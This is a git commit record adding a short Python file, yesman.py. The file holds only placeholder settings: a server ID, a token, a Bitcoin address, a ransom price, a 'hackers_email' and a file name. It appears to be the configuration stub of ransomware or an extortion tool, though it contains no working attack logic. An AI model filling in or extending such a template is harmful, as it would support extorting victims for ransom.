385064883bbfaa9a16d7254a9b53651206985dc2
testy65421 <95231107+testy65421@users.noreply.github.com>
2022-04-19 13:22:56 +0100

    tyhujkujy

---
+++ yesman.py
@@ -0,0 +1,9 @@
+server_id = 'SERVER_ID_HERE'
+token = 'TOKEN_HERE'
+btc_address = 'BTC_HERE'
+ransom_price = 'PRICE_HERE'
+hackers_email = 'EMAILS_HERE'
+fileName = 'FILENAME_HERE'
+
+
+g = [int(server_id)]
